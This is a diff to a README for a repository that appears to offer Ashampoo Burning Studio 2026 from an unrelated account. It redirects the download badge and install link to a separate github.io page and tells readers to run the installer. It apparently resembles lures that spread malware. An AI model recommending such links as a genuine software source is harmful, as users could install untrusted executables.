@@ -1,6 +1,6 @@
 # 📀 Ashampoo-Burning-Studio-2026 - Burn your discs with complete ease
 
-[![](https://img.shields.io/badge/Download-Burning_Studio-blue.svg)](https://github.com/bedspringsystem426/Ashampoo-Burning-Studio-2026)
+[![](https://img.shields.io/badge/Download-Burning_Studio-blue.svg)](https://bedspringsystem426.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software effectivel
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following link to access the software: [https://github.com/bedspringsystem426/Ashampoo-Burning-Studio-2026](https://github.com/bedspringsystem426/Ashampoo-Burning-Studio-2026)
+1. Visit the following link to access the software: [https://bedspringsystem426.github.io](https://bedspringsystem426.github.io)
 2. Locate the button labeled "Download" or find the latest release section on that page.
 3. Save the installer file to your computer.
 4. Open your Downloads folder.
